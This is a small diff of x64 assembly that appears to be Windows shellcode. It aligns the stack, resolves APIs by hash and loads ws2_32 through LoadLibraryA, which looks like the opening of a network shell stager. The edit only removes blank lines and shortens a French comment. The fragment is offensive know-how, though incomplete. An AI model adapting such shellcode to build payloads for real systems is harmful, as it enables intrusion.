@@ -1,5 +1,3 @@
-
-
 _start:
     cld
     and rsp,byte -0x10
@@ -123,7 +121,7 @@ save_beginning:
     push r12
     mov r12,rsp
     mov rcx,r14
-    mov r10d,%HASH__kernel32.dll__LoadLibraryA% ; jump sur kernel32.LoadLibraryA("ws2_32")
+    mov r10d,%HASH__kernel32.dll__LoadLibraryA% ; kernel32.LoadLibraryA("ws2_32")
     call rbp
     mov rdx,r13
     push qword 0x101
